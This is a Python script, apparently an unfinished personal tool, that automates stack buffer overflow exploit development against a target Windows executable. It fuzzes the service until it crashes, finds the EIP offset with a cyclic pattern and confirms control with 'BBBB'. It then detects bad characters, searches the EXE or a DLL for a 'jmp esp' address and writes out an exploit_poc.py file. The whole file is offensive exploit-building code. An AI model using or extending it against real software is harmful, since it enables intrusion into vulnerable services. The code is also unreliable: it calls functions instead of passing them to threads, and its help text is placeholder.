import threading
from radare import Program
from find_badchars import FindBadchars
from helpers import pattern_gen, pattern_search, return_pretty_hex
import argparse
import sys

def run_expl(args):
    program = Program(args["exe_path"], args["flags"], args["ip"], int(args["port"]))
    prefix = args["prefix"]
    threading.Thread(target=program.run_program()).start()
    threading.Thread(target=program.fuzz(prefix, counter=int(args["fuzz_counter"]), endfix=args["endfix"])).start()

    if not program.detect_bof(0x41414141):
        print("[ - ] BOF is not successfuly used.")
        exit(1)

    program.restart()

    pattern = pattern_gen(program.crashed_counter)

    threading.Thread(target=program.run_program()).start()
    threading.Thread(target=program.exploit(prefix, pattern, "", "", b'', "")).start()

    current_eip = program.get_register_value_as_string("eip")

    offset = pattern_search(current_eip)
    new_eip = 4*"B"

    program.restart()

    threading.Thread(target=program.run_program()).start()
    
    #TODO: I have to calculate that "offset" instead of getting from user !!!

    threading.Thread(target=program.exploit(prefix, "\x41"*offset, new_eip, int(args["offset"])*"\x90", b'', "")).start()

    current_eip = program.get_register_value("eip")

    if not program.successfuly_overwrited(0x42424242, offset):
        print("[ - ] BOF is not successfuly overwritten with BBBB.")
        exit(1)

    find_bad_chars = FindBadchars(prefix, offset, new_eip, program, args["ip"], int(args["port"]))
    bad_chars = find_bad_chars.find_badchars(int(args["offset"]))


    int_badchars = []
    str_badchars = ""
    for char in bad_chars:
        int_badchars.append(ord(char))
        str_badchars+=char

    print("[ * ] All badchars are found!:\t", return_pretty_hex(str_badchars))
    esp = None
    if args["dll_path"]:
        esp = program.get_jmp_esp_addr(args["dll_path"],int_badchars)
        if esp is None:
            esp = program.get_jmp_esp_addr(args["exe_path"],int_badchars)
    else:
        esp = program.get_jmp_esp_addr(args["exe_path"],int_badchars)

    if esp is None:
        print("[ - ] There is no proper address for jmp esp. Exiting program. ")
        exit(1)
    #args["offset"] = args["offset"] * "\x90"
    program.create_file(prefix, offset, esp, args["offset"], "", args["endfix"], str_badchars ,
                        args["output"], _ip = args["original_ip"]) #ip of machine


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description='SOME DESCRIPTION',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    #TODO: Change help messages, example usage etc.
    parser.add_argument('--output', default=('exploit_poc.py'),
                        help='Name to use for output python file name')

    parser.add_argument(
        '--vuln_exe',
        help='SOME HELP MESSAGE')
    
    parser.add_argument(
        '--vuln_dll',
        help='SOME HELP MESSAGE')

    parser.add_argument(
        '--radare_flags', default=(["-d", "-2"]),
        help='SOME HELP MESSAGE'
    )

    parser.add_argument(
        '--port',
        help='SOME HELP MESSAGE'
    )

    parser.add_argument(
        '--fuzz_counter', default=(100),
        help='SOME HELP MESSAGE'
    )
    
    parser.add_argument(
        '--ip', default=('127.0.0.1'),
        help='SOME HELP MESSAGE')
    
    parser.add_argument(
        '--prefix', default=(""),
        help='SOME HELP MESSAGE')

    parser.add_argument(
        '--endfix', default=(""),
        help='SOME HELP MESSAGE')

    parser.add_argument(
        '--offset', default=(10),
        help='SOME HELP MESSAGE')

    parser.add_argument(
        '--original_ip', default=('127.0.0.1'),
        help='SOME HELP MESSAGE')

    args = parser.parse_args(argv)

    if not args.vuln_exe:
        print("Need to set absolute exe path and dll!")
        exit(1)
        #TODO: return help message
    #TODO: check if files are exist
    #TODO: check also other args ! port should be int etc.


    ret = {"ip": args.ip, "port": args.port, "exe_path": args.vuln_exe, "dll_path":args.vuln_dll,
            "endfix": args.endfix, "prefix": args.prefix, "original_ip": args.original_ip, "output": args.output,
            "flags": args.radare_flags, "fuzz_counter": args.fuzz_counter, "offset": args.offset}

    run_expl(ret)
    

def main():
    try:
        args = parse_args(sys.argv[1:])
        sys.exit(0)
    except ValueError as exinfo:
        print(exinfo)
        sys.exit(1)

main()